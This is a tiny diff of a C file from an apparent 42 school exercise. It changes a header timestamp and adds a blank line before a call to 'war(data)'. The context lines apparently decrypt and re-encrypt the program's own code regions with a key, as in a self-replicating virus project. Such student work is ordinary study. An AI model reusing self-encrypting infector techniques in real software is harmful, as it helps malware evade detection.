@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/27 12:20:54 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/03 17:43:03 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/04 11:45:59 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -84,5 +84,6 @@ ERR:
 
 	update_two(&data->key, (char*)opening, (size_t)war - (size_t)opening);
 	revert_two(&data->key, (char*)war, (size_t)locate - (size_t)war);
+
 	war(data);
 }
